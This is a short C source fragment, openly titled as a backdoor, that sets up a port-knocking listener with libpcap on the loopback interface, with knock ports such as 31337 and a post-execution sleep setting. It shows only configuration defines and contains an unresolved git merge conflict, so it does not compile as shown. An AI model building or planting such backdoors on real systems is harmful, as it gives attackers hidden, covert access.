#include <stdio.h>
#include <stdlib.h>
#include <pcap.h>
#include "backHelper.h"
#include "backHelper.c"

// ===== Backdoor =====
# define INTERFACE "lo"                     // interface to listen on
<<<<<<< HEAD
# define SINGLE_KNOCK "31337"             // used for listening on a single port
//# define MULTI_KNOCK "31337","8008","4444"  // if want to define in command line: -DMULTI_KNOCK=\"31337\",\"8008\",\"4444\"
=======
//# define SINGLE_KNOCK "31337"             // used for listening on a single port
# define MULTI_KNOCK {31337,8008,4445}  // if want to define in command line: -DMULTI_KNOCK=\"31337\",\"8008\",\"4444\"
>>>>>>> e7b26c10726f79d2705670303af2dacb6d6d52b7
# define NUM_PORTS 3                        // how many ports will be knocked. Required only for MULTI_KNOCK. len(MULTI_KNOCK)
# define SLEEP 3                            // ifdef, the programs will sleep for x seconds after process execution. If not defined, sleeps Rand([1,15]) seconds.
